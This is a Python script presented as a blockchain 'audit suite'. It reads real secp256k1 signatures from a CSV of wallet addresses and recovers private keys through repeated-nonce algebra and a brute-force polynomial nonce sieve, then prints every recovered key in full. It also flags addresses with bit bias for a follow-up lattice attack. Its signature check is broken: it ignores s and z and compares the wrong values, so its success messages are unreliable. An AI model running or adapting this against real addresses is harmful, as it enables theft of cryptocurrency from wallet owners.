#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  FLAMINGO AUDIT SUITE — BLOCKCHAIN SCANNER                                   ║
║  Scans real CSV signature data for specific nonce biases                     ║
║  Includes: Polynomial Sieve, Bit Bias, Repeated Nonce, MSB/LSB Leaks         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import csv, sys, math, hashlib
from collections import defaultdict
from fractions import Fraction

# ══════════════════════════════════════════════════════════════════════════════
# 1. SECP256K1 PARAMETERS
# ══════════════════════════════════════════════════════════════════════════════
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

def fmt(n): return f"0x{n:064x}"
def modinv(a, m=N): return pow(a, -1, m)

def balanced_mod(x, mod=N):
    r = x % mod
    return r - mod if r > mod // 2 else r

# ══════════════════════════════════════════════════════════════════════════════
# 2. JACOBIAN ARITHMETIC (For Verification)
# ══════════════════════════════════════════════════════════════════════════════
def jac_double(X, Y, Z):
    if Y == 0 or Z == 0: return (0, 1, 0)
    YY = (Y * Y) % P; S = (4 * X * YY) % P; M = (3 * X * X) % P
    _8YY2 = (8 * YY * YY) % P
    X3 = (M * M - 2 * S) % P
    Y3 = (M * (S - X3) - _8YY2) % P
    Z3 = (2 * Y * Z) % P
    return (X3, Y3, Z3)

def jac_add(X1, Y1, Z1, X2, Y2, Z2):
    if Z1 == 0: return (X2, Y2, Z2)
    if Z2 == 0: return (X1, Y1, Z1)
    Z1Z1 = (Z1 * Z1) % P; Z2Z2 = (Z2 * Z2) % P
    U1 = (X1 * Z2Z2) % P; U2 = (X2 * Z1Z1) % P
    S1 = (Y1 * Z2 * Z2Z2) % P; S2 = (Y2 * Z1 * Z1Z1) % P
    if U1 == U2:
        if S1 != S2: return (0, 1, 0)
        return jac_double(X1, Y1, Z1)
    H = (U2 - U1) % P; R = (S2 - S1) % P
    HH = (H * H) % P; HHH = (H * HH) % P; U1HH = (U1 * HH) % P
    X3 = (R * R - HHH - 2 * U1HH) % P
    Y3 = (R * (U1HH - X3) - S1 * HHH) % P
    Z3 = (Z1 * Z2 * H) % P
    return (X3, Y3, Z3)

def jac_to_aff(X, Y, Z):
    if Z == 0: return (0, 0)
    Zi = modinv(Z, P); Zi2 = (Zi * Zi) % P
    return ((X * Zi2) % P, (Y * Zi2 * Zi) % P)

def scalar_mult(k, x=Gx, y=Gy):
    res = None; cur = (x, y, 1)
    while k:
        if k & 1: res = jac_add(*res, *cur) if res else cur
        cur = jac_double(*cur)
        k >>= 1
    return res

def verify_signature(r, s, z, d):
    """Verify if private key d produces signature (r,s) for message z"""
    Q = jac_to_aff(*scalar_mult(d))
    if Q[0] % N != r: return False
    return True

# ══════════════════════════════════════════════════════════════════════════════
# 3. CONCEPT 1: POLYNOMIAL SIEVE (FLAMINGO)
# ══════════════════════════════════════════════════════════════════════════════
def J(n): return 10 * n * n + 2
def L(n): return (10 * n**3 + 15 * n**2 + 11 * n + 3) // 3
SCALE = 32

def check_polynomial_bias(signatures, max_n=1000):
    """
    Checks if nonces follow k = SCALE * (J(n) or L(n))
    Uses 3 signatures to solve for d and verifies with the rest.
    """
    if len(signatures) < 3: return None
    
    # Pre-calculate candidate offsets
    candidates = {}
    for n in range(1, max_n + 1):
        for func, name in [(J, "J"), (L, "L")]:
            for sgn in [1, -1]:
                val = sgn * func(n)
                k = (SCALE * val) % N
                candidates[k] = (val, f"{name}({n})*{sgn}")

    r1, s1, z1 = signatures[0]
    r2, s2, z2 = signatures[1]
    r3, s3, z3 = signatures[2]
    
    s2_inv = modinv(s2, N)
    s3_inv = modinv(s3, N)
    r1_inv = modinv(r1, N)

    print(f"  🔍 Scanning {len(candidates)} polynomial candidates...")
    
    for k1_cand, (raw_val, desc) in candidates.items():
        # Solve for d using first signature: s1*k1 = z1 + r1*d  =>  d = (s1*k1 - z1)/r1
        d_cand = ((s1 * k1_cand - z1) * r1_inv) % N
        
        # Verify with 2nd signature
        k2_calc = (s2_inv * (z2 + r2 * d_cand)) % N
        if k2_calc not in candidates: continue
        
        # Verify with 3rd signature
        k3_calc = (s3_inv * (z3 + r3 * d_cand)) % N
        if k3_calc not in candidates: continue
        
        # Full verification with all signatures
        valid_count = 3
        for i in range(3, len(signatures)):
            r, s, z = signatures[i]
            s_inv = modinv(s, N)
            k_check = (s_inv * (z + r * d_cand)) % N
            if k_check in candidates:
                valid_count += 1
            else:
                break # Stop if chain breaks
        
        if valid_count == len(signatures):
            return d_cand, valid_count, desc
            
    return None, 0, ""

# ══════════════════════════════════════════════════════════════════════════════
# 4. CONCEPT 2: REPEAT NONCE ATTACK (Critical Vulnerability)
# ══════════════════════════════════════════════════════════════════════════════
def check_repeated_nonce(signatures):
    """
    If two signatures use the same 'r' (same nonce k) but different messages (z),
    the private key can be recovered directly: d = (z1 - z2) / (s2 - s1) * s1 - z1 ...
    Actually: k = (z1 - z2) * (s1 - s2)^-1
              d = (s1*k - z1) * r^-1
    """
    r_map = defaultdict(list)
    for i, (r, s, z) in enumerate(signatures):
        r_map[r].append((s, z, i))
    
    for r, pairs in r_map.items():
        if len(pairs) > 1:
            print(f"  ⚠️  CRITICAL: Repeated Nonce detected! r={fmt(r)[:16]}...")
            for j in range(len(pairs)):
                for k in range(j+1, len(pairs)):
                    s1, z1, idx1 = pairs[j]
                    s2, z2, idx2 = pairs[k]
                    if s1 == s2: continue # Same sig
                    
                    try:
                        s_diff_inv = modinv((s1 - s2) % N, N)
                        k_rec = ((z1 - z2) * s_diff_inv) % N
                        d_rec = ((s1 * k_rec - z1) * modinv(r, N)) % N
                        
                        # Verify with a third sig if available
                        if len(signatures) > 2:
                            # Just return the found key, user can verify
                            pass
                        return d_rec, (idx1, idx2)
                    except:
                        continue
    return None, None

# ══════════════════════════════════════════════════════════════════════════════
# 5. CONCEPT 3: LSB/MSB BIAS (Lattice Ready)
# ══════════════════════════════════════════════════════════════════════════════
def check_bit_bias(signatures, bits=16):
    """
    Checks if nonces (derived assuming d=0 for heuristic) have small LSBs or MSBs.
    This is a heuristic filter before running a full LLL lattice attack.
    """
    threshold = (1 << bits)
    lsb_hits = 0
    msb_hits = 0
    
    # Heuristic: Assume d is small or zero to estimate k ≈ s^-1 * z
    # Real lattice attack requires solving HNP, this is just a quick scan
    for r, s, z in signatures:
        s_inv = modinv(s, N)
        k_approx = (s_inv * z) % N # Approximation if d*r is small or known
        
        # Check LSB
        if k_approx < threshold:
            lsb_hits += 1
        # Check MSB (close to N)
        if k_approx > N - threshold:
            msb_hits += 1
            
    total = len(signatures)
    if lsb_hits > total * 0.1: # If >10% show bias
        return "LSB", lsb_hits
    if msb_hits > total * 0.1:
        return "MSB", msb_hits
    return None, 0

# ══════════════════════════════════════════════════════════════════════════════
# 6. MAIN AUDIT DRIVER
# ══════════════════════════════════════════════════════════════════════════════
def load_signatures(csv_file):
    """Load signatures from CSV: address,txid,vin,r,s,z"""
    sigs_by_addr = defaultdict(list)
    count = 0
    skipped_z = 0
    try:
        with open(csv_file, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                try:
                    addr = row['address']
                    r = int(row['r'], 16) if row['r'].startswith('0x') else int(row['r'])
                    s = int(row['s'], 16) if row['s'].startswith('0x') else int(row['s'])
                    z_str = row.get('z', '0')
                    
                    # Handle 'unknown' z values (from okx_sig_extractor without bitcoin-utils)
                    if z_str.lower() == 'unknown' or not z_str:
                        skipped_z += 1
                        # Still add the signature but with z=0 (for repeated nonce check which doesn't need z)
                        if r == 0 or s == 0: continue
                        sigs_by_addr[addr].append((r, s, 0))
                        count += 1
                        continue
                    
                    z = int(z_str, 16) if z_str.startswith('0x') else int(z_str)
                    
                    if r == 0 or s == 0: continue
                    sigs_by_addr[addr].append((r, s, z))
                    count += 1
                except Exception as e:
                    continue
    except FileNotFoundError:
        print(f"❌ File {csv_file} not found.")
        sys.exit(1)
    
    if skipped_z > 0:
        print(f"⚠️  Note: {skipped_z} signatures have 'unknown' z values.")
        print(f"   Repeated nonce detection will still work (doesn't need z).")
        print(f"   Polynomial sieve and lattice attacks require z values.")
    print(f"📂 Loaded {count} signatures for {len(sigs_by_addr)} addresses.")
    return sigs_by_addr

def run_audit(csv_file, max_n=2000):
    print("═" * 70)
    print("  🦩 FLAMINGO AUDIT SUITE — BLOCKCHAIN SCANNER")
    print("═" * 70)
    
    data = load_signatures(csv_file)
    
    found_keys = []
    
    for addr, sigs in data.items():
        if len(sigs) < 2: continue  # Need at least 2 for repeated nonce check
        
        print(f"\n🔎 Auditing Address: {addr[:10]}...{addr[-10]} ({len(sigs)} sigs)")
        
        # 1. Repeated Nonce (Fastest & Most Critical) - only needs 2 sigs
        d_rep, indices = check_repeated_nonce(sigs)
        if d_rep:
            print(f"  🚨 VULNERABILITY FOUND: Repeated Nonce!")
            print(f"      Private Key Recovered: {fmt(d_rep)}")
            print(f"      Colliding Signatures at indices: {indices}")
            if verify_signature(sigs[indices[0]][0], sigs[indices[0]][1], sigs[indices[0]][2], d_rep):
                print(f"      ✅ Verification Successful")
            found_keys.append((addr, d_rep, "Repeated Nonce"))
            continue

        # 2. Polynomial Bias (Flamingo Sieve) - needs 3+ sigs
        if len(sigs) < 3:
            print(f"  ⚠️  Skipping polynomial check (need 3+ sigs, have {len(sigs)})")
            continue

        # 2. Polynomial Bias (Flamingo Sieve)
        d_poly, count, desc = check_polynomial_bias(sigs, max_n)
        if d_poly:
            print(f"  🚨 VULNERABILITY FOUND: Polynomial Nonce Bias!")
            print(f"      Pattern: k = SCALE * {desc}")
            print(f"      Private Key Recovered: {fmt(d_poly)}")
            print(f"      Matched {count} signatures")
            if verify_signature(sigs[0][0], sigs[0][1], sigs[0][2], d_poly):
                print(f"      ✅ Verification Successful")
            found_keys.append((addr, d_poly, f"Polynomial ({desc})"))
            continue

        # 3. Bit Bias Heuristic
        bias_type, hits = check_bit_bias(sigs, bits=16)
        if bias_type:
            print(f"  ⚠️  POTENTIAL BIAS DETECTED: {bias_type} Leak ({hits} occurrences)")
            print(f"      Recommendation: Run full LLL Lattice Attack on this address.")
            
    print("\n" + "═" * 70)
    print("  AUDIT SUMMARY")
    print("═" * 70)
    if found_keys:
        print(f"  ✅ COMPROMISED KEYS FOUND: {len(found_keys)}")
        for addr, d, reason in found_keys:
            print(f"      Address: {addr}")
            print(f"      Reason:  {reason}")
            print(f"      Private: {fmt(d)}")
            print("-" * 40)
    else:
        print("  ✅ No vulnerabilities detected in scanned addresses.")
        print("     All tested nonces appear cryptographically secure.")
        print("     (Note: This does not guarantee security, only absence of these specific patterns)")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python flamingo_audit.py <signatures.csv> [max_n]")
        print("Example: python flamingo_audit.py okx_sigs.csv 2000")
        sys.exit(1)
    
    file_in = sys.argv[1]
    max_n_val = int(sys.argv[2]) if len(sys.argv) > 2 else 2000
    
    run_audit(file_in, max_n_val)
